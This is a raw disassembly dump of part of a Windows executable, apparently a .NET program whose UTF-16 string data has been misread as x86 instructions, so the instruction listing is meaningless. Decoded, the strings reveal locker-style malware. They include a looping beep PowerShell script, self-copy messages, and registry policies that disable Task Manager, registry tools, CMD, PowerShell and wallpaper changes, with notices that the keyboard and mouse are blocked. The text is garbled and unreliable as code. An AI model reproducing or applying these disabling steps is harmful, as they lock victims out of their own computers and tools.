  407997:	73 00                	jae    0x407999
  407999:	00 1f                	add    %bl,(%edi)
  40799b:	3d d8 13 dd 20       	cmp    $0x20dd13d8,%eax
  4079a0:	00 4f 00             	add    %cl,0x0(%edi)
  4079a3:	41                   	inc    %ecx
  4079a4:	00 43 00             	add    %al,0x0(%ebx)
  4079a7:	20 00                	and    %al,(%eax)
  4079a9:	44                   	inc    %esp
  4079aa:	00 49 00             	add    %cl,0x0(%ecx)
  4079ad:	53                   	push   %ebx
  4079ae:	00 41 00             	add    %al,0x0(%ecx)
  4079b1:	42                   	inc    %edx
  4079b2:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  4079b6:	00 44 00 01          	add    %al,0x1(%eax,%eax,1)
  4079ba:	37                   	aaa
  4079bb:	28 23                	sub    %ah,(%ebx)
  4079bd:	0f fe 20             	paddd  (%eax),%mm4
  4079c0:	00 4b 00             	add    %cl,0x0(%ebx)
  4079c3:	45                   	inc    %ebp
  4079c4:	00 59 00             	add    %bl,0x0(%ecx)
  4079c7:	42                   	inc    %edx
  4079c8:	00 4f 00             	add    %cl,0x0(%edi)
  4079cb:	41                   	inc    %ecx
  4079cc:	00 52 00             	add    %dl,0x0(%edx)
  4079cf:	44                   	inc    %esp
  4079d0:	00 20                	add    %ah,(%eax)
  4079d2:	00 26                	add    %ah,(%esi)
  4079d4:	00 20                	add    %ah,(%eax)
  4079d6:	00 4d 00             	add    %cl,0x0(%ebp)
  4079d9:	4f                   	dec    %edi
  4079da:	00 55 00             	add    %dl,0x0(%ebp)
  4079dd:	53                   	push   %ebx
  4079de:	00 45 00             	add    %al,0x0(%ebp)
  4079e1:	20 00                	and    %al,(%eax)
  4079e3:	42                   	inc    %edx
  4079e4:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  4079e8:	00 43 00             	add    %al,0x0(%ebx)
  4079eb:	4b                   	dec    %ebx
  4079ec:	00 45 00             	add    %al,0x0(%ebp)
  4079ef:	44                   	inc    %esp
  4079f0:	00 01                	add    %al,(%ecx)
  4079f2:	82 21 0d             	andb   $0xd,(%ecx)
  4079f5:	00 0a                	add    %cl,(%edx)
  4079f7:	00 41 00             	add    %al,0x0(%ecx)
  4079fa:	64 00 64 00 2d       	add    %ah,%fs:0x2d(%eax,%eax,1)
  4079ff:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  407a03:	00 70 00             	add    %dh,0x0(%eax)
  407a06:	65 00 20             	add    %ah,%gs:(%eax)
  407a09:	00 2d 00 41 00 73    	add    %ch,0x73004100
  407a0f:	00 73 00             	add    %dh,0x0(%ebx)
  407a12:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407a16:	62 00                	bound  %eax,(%eax)
  407a18:	6c                   	insb   (%dx),%es:(%edi)
  407a19:	00 79 00             	add    %bh,0x0(%ecx)
  407a1c:	4e                   	dec    %esi
  407a1d:	00 61 00             	add    %ah,0x0(%ecx)
  407a20:	6d                   	insl   (%dx),%es:(%edi)
  407a21:	00 65 00             	add    %ah,0x0(%ebp)
  407a24:	20 00                	and    %al,(%eax)
  407a26:	53                   	push   %ebx
  407a27:	00 79 00             	add    %bh,0x0(%ecx)
  407a2a:	73 00                	jae    0x407a2c
  407a2c:	74 00                	je     0x407a2e
  407a2e:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407a32:	2e 00 57 00          	add    %dl,%cs:0x0(%edi)
  407a36:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  407a3c:	6f                   	outsl  %ds:(%esi),(%dx)
  407a3d:	00 77 00             	add    %dh,0x0(%edi)
  407a40:	73 00                	jae    0x407a42
  407a42:	2e 00 46 00          	add    %al,%cs:0x0(%esi)
  407a46:	6f                   	outsl  %ds:(%esi),(%dx)
  407a47:	00 72 00             	add    %dh,0x0(%edx)
  407a4a:	6d                   	insl   (%dx),%es:(%edi)
  407a4b:	00 73 00             	add    %dh,0x0(%ebx)
  407a4e:	0d 00 0a 00 24       	or     $0x24000a00,%eax
  407a53:	00 70 00             	add    %dh,0x0(%eax)
  407a56:	6c                   	insb   (%dx),%es:(%edi)
  407a57:	00 61 00             	add    %ah,0x0(%ecx)
  407a5a:	79 00                	jns    0x407a5c
  407a5c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407a60:	20 00                	and    %al,(%eax)
  407a62:	3d 00 20 00 4e       	cmp    $0x4e002000,%eax
  407a67:	00 65 00             	add    %ah,0x0(%ebp)
  407a6a:	77 00                	ja     0x407a6c
  407a6c:	2d 00 4f 00 62       	sub    $0x62004f00,%eax
  407a71:	00 6a 00             	add    %ch,0x0(%edx)
  407a74:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407a78:	74 00                	je     0x407a7a
  407a7a:	20 00                	and    %al,(%eax)
  407a7c:	53                   	push   %ebx
  407a7d:	00 79 00             	add    %bh,0x0(%ecx)
  407a80:	73 00                	jae    0x407a82
  407a82:	74 00                	je     0x407a84
  407a84:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407a88:	2e 00 4d 00          	add    %cl,%cs:0x0(%ebp)
  407a8c:	65 00 64 00 69       	add    %ah,%gs:0x69(%eax,%eax,1)
  407a91:	00 61 00             	add    %ah,0x0(%ecx)
  407a94:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  407a98:	6f                   	outsl  %ds:(%esi),(%dx)
  407a99:	00 75 00             	add    %dh,0x0(%ebp)
  407a9c:	6e                   	outsb  %ds:(%esi),(%dx)
  407a9d:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  407aa1:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  407aa5:	00 79 00             	add    %bh,0x0(%ecx)
  407aa8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407aac:	0d 00 0a 00 24       	or     $0x24000a00,%eax
  407ab1:	00 70 00             	add    %dh,0x0(%eax)
  407ab4:	6c                   	insb   (%dx),%es:(%edi)
  407ab5:	00 61 00             	add    %ah,0x0(%ecx)
  407ab8:	79 00                	jns    0x407aba
  407aba:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407abe:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  407ac2:	74 00                	je     0x407ac4
  407ac4:	72 00                	jb     0x407ac6
  407ac6:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407aca:	6d                   	insl   (%dx),%es:(%edi)
  407acb:	00 20                	add    %ah,(%eax)
  407acd:	00 3d 00 20 00 5b    	add    %bh,0x5b002000
  407ad3:	00 53 00             	add    %dl,0x0(%ebx)
  407ad6:	79 00                	jns    0x407ad8
  407ad8:	73 00                	jae    0x407ada
  407ada:	74 00                	je     0x407adc
  407adc:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407ae0:	2e 00 4d 00          	add    %cl,%cs:0x0(%ebp)
  407ae4:	65 00 64 00 69       	add    %ah,%gs:0x69(%eax,%eax,1)
  407ae9:	00 61 00             	add    %ah,0x0(%ecx)
  407aec:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  407af0:	79 00                	jns    0x407af2
  407af2:	73 00                	jae    0x407af4
  407af4:	74 00                	je     0x407af6
  407af6:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407afa:	53                   	push   %ebx
  407afb:	00 6f 00             	add    %ch,0x0(%edi)
  407afe:	75 00                	jne    0x407b00
  407b00:	6e                   	outsb  %ds:(%esi),(%dx)
  407b01:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  407b05:	00 5d 00             	add    %bl,0x0(%ebp)
  407b08:	3a 00                	cmp    (%eax),%al
  407b0a:	3a 00                	cmp    (%eax),%al
  407b0c:	41                   	inc    %ecx
  407b0d:	00 73 00             	add    %dh,0x0(%ebx)
  407b10:	74 00                	je     0x407b12
  407b12:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407b16:	69 00 73 00 6b 00    	imul   $0x6b0073,(%eax),%eax
  407b1c:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  407b20:	74 00                	je     0x407b22
  407b22:	72 00                	jb     0x407b24
  407b24:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407b28:	6d                   	insl   (%dx),%es:(%edi)
  407b29:	00 0d 00 0a 00 77    	add    %cl,0x77000a00
  407b2f:	00 68 00             	add    %ch,0x0(%eax)
  407b32:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  407b38:	28 00                	sub    %al,(%eax)
  407b3a:	24 00                	and    $0x0,%al
  407b3c:	74 00                	je     0x407b3e
  407b3e:	72 00                	jb     0x407b40
  407b40:	75 00                	jne    0x407b42
  407b42:	65 00 29             	add    %ch,%gs:(%ecx)
  407b45:	00 20                	add    %ah,(%eax)
  407b47:	00 7b 00             	add    %bh,0x0(%ebx)
  407b4a:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  407b4f:	00 20                	add    %ah,(%eax)
  407b51:	00 20                	add    %ah,(%eax)
  407b53:	00 20                	add    %ah,(%eax)
  407b55:	00 24 00             	add    %ah,(%eax,%eax,1)
  407b58:	70 00                	jo     0x407b5a
  407b5a:	6c                   	insb   (%dx),%es:(%edi)
  407b5b:	00 61 00             	add    %ah,0x0(%ecx)
  407b5e:	79 00                	jns    0x407b60
  407b60:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407b64:	2e 00 50 00          	add    %dl,%cs:0x0(%eax)
  407b68:	6c                   	insb   (%dx),%es:(%edi)
  407b69:	00 61 00             	add    %ah,0x0(%ecx)
  407b6c:	79 00                	jns    0x407b6e
  407b6e:	53                   	push   %ebx
  407b6f:	00 79 00             	add    %bh,0x0(%ecx)
  407b72:	6e                   	outsb  %ds:(%esi),(%dx)
  407b73:	00 63 00             	add    %ah,0x0(%ebx)
  407b76:	28 00                	sub    %al,(%eax)
  407b78:	29 00                	sub    %eax,(%eax)
  407b7a:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  407b7f:	00 20                	add    %ah,(%eax)
  407b81:	00 20                	add    %ah,(%eax)
  407b83:	00 20                	add    %ah,(%eax)
  407b85:	00 53 00             	add    %dl,0x0(%ebx)
  407b88:	74 00                	je     0x407b8a
  407b8a:	61                   	popa
  407b8b:	00 72 00             	add    %dh,0x0(%edx)
  407b8e:	74 00                	je     0x407b90
  407b90:	2d 00 53 00 6c       	sub    $0x6c005300,%eax
  407b95:	00 65 00             	add    %ah,0x0(%ebp)
  407b98:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  407b9c:	20 00                	and    %al,(%eax)
  407b9e:	2d 00 4d 00 69       	sub    $0x69004d00,%eax
  407ba3:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407ba7:	00 69 00             	add    %ch,0x0(%ecx)
  407baa:	73 00                	jae    0x407bac
  407bac:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407bb0:	6f                   	outsl  %ds:(%esi),(%dx)
  407bb1:	00 6e 00             	add    %ch,0x0(%esi)
  407bb4:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  407bb8:	20 00                	and    %al,(%eax)
  407bba:	33 00                	xor    (%eax),%eax
  407bbc:	30 00                	xor    %al,(%eax)
  407bbe:	30 00                	xor    %al,(%eax)
  407bc0:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  407bc5:	00 20                	add    %ah,(%eax)
  407bc7:	00 20                	add    %ah,(%eax)
  407bc9:	00 20                	add    %ah,(%eax)
  407bcb:	00 5b 00             	add    %bl,0x0(%ebx)
  407bce:	53                   	push   %ebx
  407bcf:	00 79 00             	add    %bh,0x0(%ecx)
  407bd2:	73 00                	jae    0x407bd4
  407bd4:	74 00                	je     0x407bd6
  407bd6:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407bda:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  407bde:	6f                   	outsl  %ds:(%esi),(%dx)
  407bdf:	00 6e 00             	add    %ch,0x0(%esi)
  407be2:	73 00                	jae    0x407be4
  407be4:	6f                   	outsl  %ds:(%esi),(%dx)
  407be5:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  407be9:	00 5d 00             	add    %bl,0x0(%ebp)
  407bec:	3a 00                	cmp    (%eax),%al
  407bee:	3a 00                	cmp    (%eax),%al
  407bf0:	42                   	inc    %edx
  407bf1:	00 65 00             	add    %ah,0x0(%ebp)
  407bf4:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  407bf8:	28 00                	sub    %al,(%eax)
  407bfa:	31 00                	xor    %eax,(%eax)
  407bfc:	30 00                	xor    %al,(%eax)
  407bfe:	30 00                	xor    %al,(%eax)
  407c00:	30 00                	xor    %al,(%eax)
  407c02:	2c 00                	sub    $0x0,%al
  407c04:	20 00                	and    %al,(%eax)
  407c06:	35 00 30 00 30       	xor    $0x30003000,%eax
  407c0b:	00 29                	add    %ch,(%ecx)
  407c0d:	00 0d 00 0a 00 7d    	add    %cl,0x7d000a00
  407c13:	00 01                	add    %al,(%ecx)
  407c15:	13 6d 00             	adc    0x0(%ebp),%ebp
  407c18:	75 00                	jne    0x407c1a
  407c1a:	73 00                	jae    0x407c1c
  407c1c:	69 00 63 00 2e 00    	imul   $0x2e0063,(%eax),%eax
  407c22:	70 00                	jo     0x407c24
  407c24:	73 00                	jae    0x407c26
  407c26:	31 00                	xor    %eax,(%eax)
  407c28:	00 09                	add    %cl,(%ecx)
  407c2a:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  407c2e:	78 00                	js     0x407c30
  407c30:	65 00 00             	add    %al,%gs:(%eax)
  407c33:	2b 3d d8 e6 dc 20    	sub    0x20dce6d8,%edi
  407c39:	00 7b 00             	add    %bh,0x0(%ebx)
  407c3c:	30 00                	xor    %al,(%eax)
  407c3e:	7d 00                	jge    0x407c40
  407c40:	20 00                	and    %al,(%eax)
  407c42:	43                   	inc    %ebx
  407c43:	00 4f 00             	add    %cl,0x0(%edi)
  407c46:	50                   	push   %eax
  407c47:	00 49 00             	add    %cl,0x0(%ecx)
  407c4a:	45                   	inc    %ebp
  407c4b:	00 53 00             	add    %dl,0x0(%ebx)
  407c4e:	20 00                	and    %al,(%eax)
  407c50:	43                   	inc    %ebx
  407c51:	00 52 00             	add    %dl,0x0(%edx)
  407c54:	45                   	inc    %ebp
  407c55:	00 41 00             	add    %al,0x0(%ecx)
  407c58:	54                   	push   %esp
  407c59:	00 45 00             	add    %al,0x0(%ebp)
  407c5c:	44                   	inc    %esp
  407c5d:	00 01                	add    %al,(%ecx)
  407c5f:	7d 41                	jge    0x407ca2
  407c61:	00 42 00             	add    %al,0x0(%edx)
  407c64:	43                   	inc    %ebx
  407c65:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  407c69:	00 46 00             	add    %al,0x0(%esi)
  407c6c:	47                   	inc    %edi
  407c6d:	00 48 00             	add    %cl,0x0(%eax)
  407c70:	49                   	dec    %ecx
  407c71:	00 4a 00             	add    %cl,0x0(%edx)
  407c74:	4b                   	dec    %ebx
  407c75:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  407c79:	00 4e 00             	add    %cl,0x0(%esi)
  407c7c:	4f                   	dec    %edi
  407c7d:	00 50 00             	add    %dl,0x0(%eax)
  407c80:	51                   	push   %ecx
  407c81:	00 52 00             	add    %dl,0x0(%edx)
  407c84:	53                   	push   %ebx
  407c85:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  407c89:	00 56 00             	add    %dl,0x0(%esi)
  407c8c:	57                   	push   %edi
  407c8d:	00 58 00             	add    %bl,0x0(%eax)
  407c90:	59                   	pop    %ecx
  407c91:	00 5a 00             	add    %bl,0x0(%edx)
  407c94:	61                   	popa
  407c95:	00 62 00             	add    %ah,0x0(%edx)
  407c98:	63 00                	arpl   %eax,(%eax)
  407c9a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407c9e:	66 00 67 00          	data16 add %ah,0x0(%edi)
  407ca2:	68 00 69 00 6a       	push   $0x6a006900
  407ca7:	00 6b 00             	add    %ch,0x0(%ebx)
  407caa:	6c                   	insb   (%dx),%es:(%edi)
  407cab:	00 6d 00             	add    %ch,0x0(%ebp)
  407cae:	6e                   	outsb  %ds:(%esi),(%dx)
  407caf:	00 6f 00             	add    %ch,0x0(%edi)
  407cb2:	70 00                	jo     0x407cb4
  407cb4:	71 00                	jno    0x407cb6
  407cb6:	72 00                	jb     0x407cb8
  407cb8:	73 00                	jae    0x407cba
  407cba:	74 00                	je     0x407cbc
  407cbc:	75 00                	jne    0x407cbe
  407cbe:	76 00                	jbe    0x407cc0
  407cc0:	77 00                	ja     0x407cc2
  407cc2:	78 00                	js     0x407cc4
  407cc4:	79 00                	jns    0x407cc6
  407cc6:	7a 00                	jp     0x407cc8
  407cc8:	30 00                	xor    %al,(%eax)
  407cca:	31 00                	xor    %eax,(%eax)
  407ccc:	32 00                	xor    (%eax),%al
  407cce:	33 00                	xor    (%eax),%eax
  407cd0:	34 00                	xor    $0x0,%al
  407cd2:	35 00 36 00 37       	xor    $0x37003600,%eax
  407cd7:	00 38                	add    %bh,(%eax)
  407cd9:	00 39                	add    %bh,(%ecx)
  407cdb:	00 00                	add    %al,(%eax)
  407cdd:	1d 44 00 69 00       	sbb    $0x690044,%eax
  407ce2:	73 00                	jae    0x407ce4
  407ce4:	61                   	popa
  407ce5:	00 62 00             	add    %ah,0x0(%edx)
  407ce8:	6c                   	insb   (%dx),%es:(%edi)
  407ce9:	00 65 00             	add    %ah,0x0(%ebp)
  407cec:	54                   	push   %esp
  407ced:	00 61 00             	add    %ah,0x0(%ecx)
  407cf0:	73 00                	jae    0x407cf2
  407cf2:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  407cf5:	00 67 00             	add    %ah,0x0(%edi)
  407cf8:	72 00                	jb     0x407cfa
  407cfa:	00 0f                	add    %cl,(%edi)
  407cfc:	74 00                	je     0x407cfe
  407cfe:	61                   	popa
  407cff:	00 73 00             	add    %dh,0x0(%ebx)
  407d02:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  407d05:	00 67 00             	add    %ah,0x0(%edi)
  407d08:	72 00                	jb     0x407d0a
  407d0a:	00 2f                	add    %ch,(%edi)
  407d0c:	3d d8 ab de 20       	cmp    $0x20deabd8,%eax
  407d11:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  407d15:	00 53 00             	add    %dl,0x0(%ebx)
  407d18:	4b                   	dec    %ebx
  407d19:	00 20                	add    %ah,(%eax)
  407d1b:	00 4d 00             	add    %cl,0x0(%ebp)
  407d1e:	41                   	inc    %ecx
  407d1f:	00 4e 00             	add    %cl,0x0(%esi)
  407d22:	41                   	inc    %ecx
  407d23:	00 47 00             	add    %al,0x0(%edi)
  407d26:	45                   	inc    %ebp
  407d27:	00 52 00             	add    %dl,0x0(%edx)
  407d2a:	20 00                	and    %al,(%eax)
  407d2c:	42                   	inc    %edx
  407d2d:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  407d31:	00 43 00             	add    %al,0x0(%ebx)
  407d34:	4b                   	dec    %ebx
  407d35:	00 45 00             	add    %al,0x0(%ebp)
  407d38:	44                   	inc    %esp
  407d39:	00 01                	add    %al,(%ecx)
  407d3b:	80 81 53 00 4f 00 46 	addb   $0x46,0x4f0053(%ecx)
  407d42:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  407d46:	00 41 00             	add    %al,0x0(%ecx)
  407d49:	52                   	push   %edx
  407d4a:	00 45 00             	add    %al,0x0(%ebp)
  407d4d:	5c                   	pop    %esp
  407d4e:	00 4d 00             	add    %cl,0x0(%ebp)
  407d51:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  407d57:	6f                   	outsl  %ds:(%esi),(%dx)
  407d58:	00 73 00             	add    %dh,0x0(%ebx)
  407d5b:	6f                   	outsl  %ds:(%esi),(%dx)
  407d5c:	00 66 00             	add    %ah,0x0(%esi)
  407d5f:	74 00                	je     0x407d61
  407d61:	5c                   	pop    %esp
  407d62:	00 57 00             	add    %dl,0x0(%edi)
  407d65:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  407d6b:	6f                   	outsl  %ds:(%esi),(%dx)
  407d6c:	00 77 00             	add    %dh,0x0(%edi)
  407d6f:	73 00                	jae    0x407d71
  407d71:	5c                   	pop    %esp
  407d72:	00 43 00             	add    %al,0x0(%ebx)
  407d75:	75 00                	jne    0x407d77
  407d77:	72 00                	jb     0x407d79
  407d79:	72 00                	jb     0x407d7b
  407d7b:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407d7f:	74 00                	je     0x407d81
  407d81:	56                   	push   %esi
  407d82:	00 65 00             	add    %ah,0x0(%ebp)
  407d85:	72 00                	jb     0x407d87
  407d87:	73 00                	jae    0x407d89
  407d89:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407d8f:	5c                   	pop    %esp
  407d90:	00 50 00             	add    %dl,0x0(%eax)
  407d93:	6f                   	outsl  %ds:(%esi),(%dx)
  407d94:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  407d98:	00 63 00             	add    %ah,0x0(%ebx)
  407d9b:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  407da1:	5c                   	pop    %esp
  407da2:	00 41 00             	add    %al,0x0(%ecx)
  407da5:	63 00                	arpl   %eax,(%eax)
  407da7:	74 00                	je     0x407da9
  407da9:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  407daf:	44                   	inc    %esp
  407db0:	00 65 00             	add    %ah,0x0(%ebp)
  407db3:	73 00                	jae    0x407db5
  407db5:	6b 00 74             	imul   $0x74,(%eax),%eax
  407db8:	00 6f 00             	add    %ch,0x0(%edi)
  407dbb:	70 00                	jo     0x407dbd
  407dbd:	00 27                	add    %ah,(%edi)
  407dbf:	4e                   	dec    %esi
  407dc0:	00 6f 00             	add    %ch,0x0(%edi)
  407dc3:	43                   	inc    %ebx
  407dc4:	00 68 00             	add    %ch,0x0(%eax)
  407dc7:	61                   	popa
  407dc8:	00 6e 00             	add    %ch,0x0(%esi)
  407dcb:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  407dcf:	6e                   	outsb  %ds:(%esi),(%dx)
  407dd0:	00 67 00             	add    %ah,0x0(%edi)
  407dd3:	57                   	push   %edi
  407dd4:	00 61 00             	add    %ah,0x0(%ecx)
  407dd7:	6c                   	insb   (%dx),%es:(%edi)
  407dd8:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  407ddc:	00 61 00             	add    %ah,0x0(%ecx)
  407ddf:	70 00                	jo     0x407de1
  407de1:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407de5:	00 39                	add    %bh,(%ecx)
  407de7:	3d d8 bc dd 0f       	cmp    $0xfddbcd8,%eax
  407dec:	fe                   	(bad)
  407ded:	20 00                	and    %al,(%eax)
  407def:	57                   	push   %edi
  407df0:	00 41 00             	add    %al,0x0(%ecx)
  407df3:	4c                   	dec    %esp
  407df4:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  407df8:	00 41 00             	add    %al,0x0(%ecx)
  407dfb:	50                   	push   %eax
  407dfc:	00 45 00             	add    %al,0x0(%ebp)
  407dff:	52                   	push   %edx
  407e00:	00 20                	add    %ah,(%eax)
  407e02:	00 43 00             	add    %al,0x0(%ebx)
  407e05:	48                   	dec    %eax
  407e06:	00 41 00             	add    %al,0x0(%ecx)
  407e09:	4e                   	dec    %esi
  407e0a:	00 47 00             	add    %al,0x0(%edi)
  407e0d:	45                   	inc    %ebp
  407e0e:	00 20                	add    %ah,(%eax)
  407e10:	00 42 00             	add    %al,0x0(%edx)
  407e13:	4c                   	dec    %esp
  407e14:	00 4f 00             	add    %cl,0x0(%edi)
  407e17:	43                   	inc    %ebx
  407e18:	00 4b 00             	add    %cl,0x0(%ebx)
  407e1b:	45                   	inc    %ebp
  407e1c:	00 44 00 01          	add    %al,0x1(%eax,%eax,1)
  407e20:	13 62 00             	adc    0x0(%edx),%esp
  407e23:	6c                   	insb   (%dx),%es:(%edi)
  407e24:	00 61 00             	add    %ah,0x0(%ecx)
  407e27:	63 00                	arpl   %eax,(%eax)
  407e29:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  407e2c:	00 6a 00             	add    %ch,0x0(%edx)
  407e2f:	70 00                	jo     0x407e31
  407e31:	67 00 00             	add    %al,(%bx,%si)
  407e34:	29 44 00 69          	sub    %eax,0x69(%eax,%eax,1)
  407e38:	00 73 00             	add    %dh,0x0(%ebx)
  407e3b:	61                   	popa
  407e3c:	00 62 00             	add    %ah,0x0(%edx)
  407e3f:	6c                   	insb   (%dx),%es:(%edi)
  407e40:	00 65 00             	add    %ah,0x0(%ebp)
  407e43:	52                   	push   %edx
  407e44:	00 65 00             	add    %ah,0x0(%ebp)
  407e47:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  407e4b:	73 00                	jae    0x407e4d
  407e4d:	74 00                	je     0x407e4f
  407e4f:	72 00                	jb     0x407e51
  407e51:	79 00                	jns    0x407e53
  407e53:	54                   	push   %esp
  407e54:	00 6f 00             	add    %ch,0x0(%edi)
  407e57:	6f                   	outsl  %ds:(%esi),(%dx)
  407e58:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  407e5c:	00 00                	add    %al,(%eax)
  407e5e:	27                   	daa
  407e5f:	3d d8 12 dd 20       	cmp    $0x20dd12d8,%eax
  407e64:	00 52 00             	add    %dl,0x0(%edx)
  407e67:	45                   	inc    %ebp
  407e68:	00 47 00             	add    %al,0x0(%edi)
  407e6b:	49                   	dec    %ecx
  407e6c:	00 53 00             	add    %dl,0x0(%ebx)
  407e6f:	54                   	push   %esp
  407e70:	00 52 00             	add    %dl,0x0(%edx)
  407e73:	59                   	pop    %ecx
  407e74:	00 20                	add    %ah,(%eax)
  407e76:	00 42 00             	add    %al,0x0(%edx)
  407e79:	4c                   	dec    %esp
  407e7a:	00 4f 00             	add    %cl,0x0(%edi)
  407e7d:	43                   	inc    %ebx
  407e7e:	00 4b 00             	add    %cl,0x0(%ebx)
  407e81:	45                   	inc    %ebp
  407e82:	00 44 00 01          	add    %al,0x1(%eax,%eax,1)
  407e86:	55                   	push   %ebp
  407e87:	53                   	push   %ebx
  407e88:	00 4f 00             	add    %cl,0x0(%edi)
  407e8b:	46                   	inc    %esi
  407e8c:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  407e90:	00 41 00             	add    %al,0x0(%ecx)
  407e93:	52                   	push   %edx
  407e94:	00 45 00             	add    %al,0x0(%ebp)
  407e97:	5c                   	pop    %esp
  407e98:	00 50 00             	add    %dl,0x0(%eax)
  407e9b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  407ea0:	00 63 00             	add    %ah,0x0(%ebx)
  407ea3:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  407ea9:	5c                   	pop    %esp
  407eaa:	00 4d 00             	add    %cl,0x0(%ebp)
  407ead:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  407eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb4:	00 73 00             	add    %dh,0x0(%ebx)
  407eb7:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb8:	00 66 00             	add    %ah,0x0(%esi)
  407ebb:	74 00                	je     0x407ebd
  407ebd:	5c                   	pop    %esp
  407ebe:	00 57 00             	add    %dl,0x0(%edi)
  407ec1:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  407ec7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ec8:	00 77 00             	add    %dh,0x0(%edi)
  407ecb:	73 00                	jae    0x407ecd
  407ecd:	5c                   	pop    %esp
  407ece:	00 53 00             	add    %dl,0x0(%ebx)
  407ed1:	79 00                	jns    0x407ed3
  407ed3:	73 00                	jae    0x407ed5
  407ed5:	74 00                	je     0x407ed7
  407ed7:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407edb:	00 15 44 00 69 00    	add    %dl,0x690044
  407ee1:	73 00                	jae    0x407ee3
  407ee3:	61                   	popa
  407ee4:	00 62 00             	add    %ah,0x0(%edx)
  407ee7:	6c                   	insb   (%dx),%es:(%edi)
  407ee8:	00 65 00             	add    %ah,0x0(%ebp)
  407eeb:	43                   	inc    %ebx
  407eec:	00 4d 00             	add    %cl,0x0(%ebp)
  407eef:	44                   	inc    %esp
  407ef0:	00 00                	add    %al,(%eax)
  407ef2:	07                   	pop    %es
  407ef3:	63 00                	arpl   %eax,(%eax)
  407ef5:	6d                   	insl   (%dx),%es:(%edi)
  407ef6:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  407efa:	15 70 00 6f 00       	adc    $0x6f0070,%eax
  407eff:	77 00                	ja     0x407f01
  407f01:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407f05:	73 00                	jae    0x407f07
  407f07:	68 00 65 00 6c       	push   $0x6c006500
  407f0c:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  407f10:	37                   	aaa
  407f11:	3d d8 ab de 20       	cmp    $0x20deabd8,%eax
  407f16:	00 43 00             	add    %al,0x0(%ebx)
  407f19:	4d                   	dec    %ebp
  407f1a:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  407f1e:	00 26                	add    %ah,(%esi)
  407f20:	00 20                	add    %ah,(%eax)
  407f22:	00 50 00             	add    %dl,0x0(%eax)
  407f25:	6f                   	outsl  %ds:(%esi),(%dx)
  407f26:	00 77 00             	add    %dh,0x0(%edi)
  407f29:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407f2d:	53                   	push   %ebx
